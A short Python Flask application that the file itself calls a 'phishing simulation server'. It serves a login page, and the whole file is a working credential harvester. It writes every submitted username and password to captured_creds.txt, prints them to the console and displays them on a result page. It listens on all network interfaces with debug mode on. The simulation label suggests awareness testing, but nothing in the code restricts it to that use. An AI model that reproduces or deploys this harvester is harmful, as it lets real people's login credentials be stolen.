from flask import Flask, render_template, request
import requests
import json

app = Flask(__name__)
LOG_FILE = "captured_creds.txt"

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    # Save to local file
    with open(LOG_FILE, "a") as f:
        f.write(f"Username/Email: {username}\n")
        f.write(f"Password: {password}\n")
        f.write("-" * 40 + "\n")

    # Print to console
    print("\n[!] CREDENTIALS CAPTURED:")
    print(f"    Username/Email: {username}")
    print(f"    Password:       {password}")
    print("-" * 40)

    # Show the captured creds on a result page
    return render_template("result.html", username=username, password=password)

if __name__ == "__main__":
    print("[*] Phishing simulation server starting...")
    print("[*] Open http://127.0.0.1:5000")
    print("[*] Captured creds will show on screen + saved to captured_creds.txt")
    app.run(debug=True, host="0.0.0.0", port=5000)
